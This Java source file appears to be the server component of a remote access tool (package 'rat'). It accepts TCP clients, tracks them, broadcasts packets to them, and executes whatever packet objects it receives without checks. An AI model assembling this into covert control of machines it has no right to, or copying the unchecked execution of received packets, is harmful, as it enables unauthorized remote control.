package de.sogomn.rat.server;

import java.net.Socket;
import java.util.ArrayList;

import de.sogomn.engine.net.TCPServer;
import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.IClientObserver;
import de.sogomn.rat.packet.IPacket;

public final class ActiveServer extends TCPServer implements IClientObserver {
	
	private Thread thread;
	
	private ArrayList<ActiveClient> clients;
	
	public ActiveServer(final int port) {
		super(port);
		
		clients = new ArrayList<ActiveClient>();
	}
	
	private ActiveClient acceptClient() {
		final Socket socket = acceptConnection();
		
		if (socket == null) {
			return null;
		}
		
		final ActiveClient client = new ActiveClient(socket);
		
		return client;
	}
	
	@Override
	public void close() {
		super.close();
		
		if (thread != null) {
			thread.interrupt();
			thread = null;
		}
		
		clients.forEach(client -> {
			client.setObserver(null);
			client.close();
		});
		clients.clear();
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		packet.execute();
	}
	
	@Override
	public void disconnected(final ActiveClient client) {
		removeClient(client);
	}
	
	public void start() {
		final Runnable runnable = () -> {
			while (isOpen()) {
				final ActiveClient client = acceptClient();
				
				if (client != null) {
					addClient(client);
				}
			}
		};
		
		thread = new Thread(runnable);
		
		thread.start();
	}
	
	public void broadcast(final IPacket packet) {
		clients.forEach(client -> {
			client.sendPacket(packet);
		});
	}
	
	public void addClient(final ActiveClient client) {
		client.setObserver(this);
		clients.add(client);
		client.start();
	}
	
	public void removeClient(final ActiveClient client) {
		client.setObserver(null);
		client.close();
		clients.remove(client);
	}
	
}
